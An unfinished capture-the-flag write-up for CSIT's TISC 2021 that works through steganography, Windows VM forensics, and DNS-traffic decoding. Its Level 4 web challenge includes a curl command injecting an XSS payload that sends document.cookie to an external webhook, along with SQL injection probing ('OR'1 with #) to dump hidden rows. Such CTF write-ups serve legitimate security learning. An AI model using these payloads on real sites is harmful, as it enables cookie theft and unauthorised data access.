Still in the midst of editing
# CSIT_TISC2021
## Level 1
### Challenge 1 : File1.wav
* Use Sonic Visualiser to open .wav file and the morse code appears.
![Morse_Code_In_File](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file1_wav.JPG)
* Flag : **CSITISLOCATEDINSCIENCEPARK**

### Challenge 2 : File2.jpg
* Information Hidden in the metadata. 
* Tricky things is when it is downloaded, photo is modified. 
* Hence we will need to use online exif tool to extract metadata from image url.
![EXIF](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file2_jpg.JPG)
* Flag : **2003:08:25 14:55:27**

### Challenge 3 : File3.jpg
1.  Used exiftool online --> no metadata
2.  Used HxD to strings to see any text hidden within the file. 
3.  Notable Strings 2 x "picture_with_text.jpg"
4.  Looked into the Hex Editor for "picture_with_text.jpg" text string and saw something suspicious : "PK"
![HXD](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_2_sus_pk_ext.JPG)
* Used binwalk to extract and xxd to look into the binaries of the unzipped file again and saw it... A suspicious looking message.
![BINWALK](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_3_extracted.JPG)
![XXD_OUT](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_4_xxd.JPG)
* Cyberchef ROT 13 and FLAG: **applecarrotpear** \
![FINAL](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-file3_jpg_5_cyberchef.JPG)   

## Windows10.ova File
### Challenge 4 : What is the name of the user?
Windows Search --> System Information --> Flag: {TISC:Adam}

### Challenge 5 : Which time was the user's most recent logon? Convert it UTC before submitting.
EventViewer --> Filter Event 4624 --> Look out for Logon Type : 2 --> Flag

### Challenge 6 : A 7z archive was deleted, what is the value of the file CRC32 hash that is inside the 7z archive?
Download 7zip --> move into vm --> install 7zip in vm --> open archive  

### Challenge 7 : Question1: How many users have an RID of 1000 or above on the machine? What is the account name for RID of 501? What is the account name for RID of 503?
go to cmd --> wmic useraccounts get sid,name --> flag 
![wmic](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge7_RID.JPG)
Flag : **1-Guest-DefaultAccount**

### Challenge 8 : Question1: How many times did the user visit https://www.csit.gov.sg/about-csit/who-we-are ? How many times did the user visit https://www.facebook.com ? How many times did the user visit https://www.live.com ?
Use Nirsoft BrowsingHistoryView 
![Browsing_Hist](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge8_BrowsingHistory.JPG)
Flag : **2**

### Challenge 9 : A device with the drive letter “Z” was connected as a shared folder in VirtualBox. What was the label of the volume? Perhaps the registry can tell us the "connected" drive?
With reference to [this](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/mapped-network-drive-disconnected): 
```
1. In Registry Editor, locate the following registry subkey: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2

2. Right-click the mapped drive that you want to remove. For example, right-click `##Server_Name#Share_Name`, and then click Delete.
```
The answer can be found at MountPoints2 \
![MPt2](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge9_MountPoints.JPG)
Flag : **VBoxSvr**

### Challenge 10 : A file with SHA1 0D97DBDBA2D35C37F434538E4DFAA06FCCC18A13 is in the VM… somewhere. What is the name of the file that is of interest?
Using any tool online that can search files by hash.
![FileFinder](https://github.com/irboi746/CSIT_TISC2021/blob/main/Resources/L1-challenge10_FileSearch_Hash.JPG)
Flag : **otter-singapore.jpg**

## Level 2
### We have detected and captured a stream of anomalous DNS network traffic sent out from one of the PALINDROME compromised servers. None of the domain names found are active. Either PALINDROME had shut them down or there's more to it than it seems. This level contains 2 flags and both flags can be found independently from the same pcap file as attached here.
Open pcap --> saw a pattern d33d(2 digit)(7char)
split 2 digit and 7 char
### DEE-NA-SAW as a need Part 2
take the python script output and throw into cyberchef
* DEE-NA-SAW part 2 has a peculiar string ***"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz+/"***
### DEE-NA-SAW as a need Part 1
* string saw above is the decoder for Part 1.
* wrote a python script to do a substitution for above string with the 2 digit numbers in part 1 (attached in this repo)
* found out that the substituted cipher is a base64 encoded data and base64 is in the form of the above ***string***
* throw into cyberchef to decode base64 with custom string
* saw PK file extension
* extract as zip file ---> "What you Seek is within"
* Flag : 

## Level 3
### An attack was detected on an internal network that blocked off all types of executable files. How did this happen? Upon further investigations, we recovered these 2 grey-scale images. What could they be?
* Downloaded the two bmp images and straight out threw it into cyberchef
* Content of 1.bmp
* Content of 2.bmp
Online tool that helps extraction : https://stegonline.georgeom.net/extract
Reference for PE format : https://stackoverflow.com/questions/34684660/how-to-determine-the-size-of-an-pe-executable-file-from-headers-and-or-footers
**Attempted but did not complete**

## Level 4
### One day, the admin of Apple Story Pte Ltd received an anonymous email.
> Dear admins of Apple Story, We are PALINDROME. We have took control over your system and stolen your secret formula! Do not fear for we are only after the money.Pay us our demand and we will be gone. For starters, we have denied all controls from you. We demand a ransom of 1 BTC to be sent to 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 by 31 dec 2021. Do not contact the police or seek for help. Failure to do so and the plant is gone. We planted a monitoring kit so do not test us. Remember 1 BTC by 31 dec 2021 and we will be gone. Muahahahaha. Regards, PALINDROME
### Management have just one instruction. Retrieve the encryption key before the deadline and solve this.
* since hint is free anyway, might as well check it right?
(insert image here)
* So... after some googling... Here are some possiblilities
   1. https://www.riskiq.com/what-is-magecart/
   2. https://heimdalsecurity.com/blog/magecart-group-conceal-stolen-credit-card-details-into-image-files/
   3. https://thehackernews.com/2021/05/magecart-hackers-now-hide-php-based.html 
* Checking out 1 : tried looking for javascripts that are running and see if there are any vulnerability. \
  below is the only script that can be found, nothing vulnerable there. \
  
  Tried all the web attacks on the payment page. Nothing much from there

* Checking out 2 : checking out the images within the website \
nothing suspicious about the svg image. Hex output seems normal
nothing suspicious about the gif. All looks normal, even after using hex editor to skim through and strings, nothing suspicious

* Checking out 3 : checking the favicon of the website
same procedure as images above which is to throw into cyberchef and look at the hex and... found these : \
which led to this : 

* Nice another webpage and it seems to be doing a POST request with a certain field.
* Reference : https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/
commands used
```
curl -X POST "http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php" -d "14c4b06b824ec593239362517f538b29=<script>document.write('<img src="https://webhook.site/694ffb57-9ed8-4db2-86ae-5463fea3af0b?c='%2bdocument.cookie%2b'" />');</script>"
```
* robots.x=txt and found 2 interesting result found
* login.php leads to admin page
* debug=TRUE leads to debug message as photo
* we can come up with the hypothesis that SQL query is 
```
SELECT * FROM status WHERE filter=filter AND ID>0
```
* from the debug message, we realise that query uses "'" single quote
* 'OR'1-- yields empty field which means that there is a special character filter
* removing "--" yields 
* Thus we seem to be very close.
* It now seem like we need to test for what are the useable characters and what are not.
* using 'OR'1 and appending special characters to it we came to # and the flag is out.
* Further investigation and we find out that # actually comments out ID>0 and hence the query will output what is on ID=0  





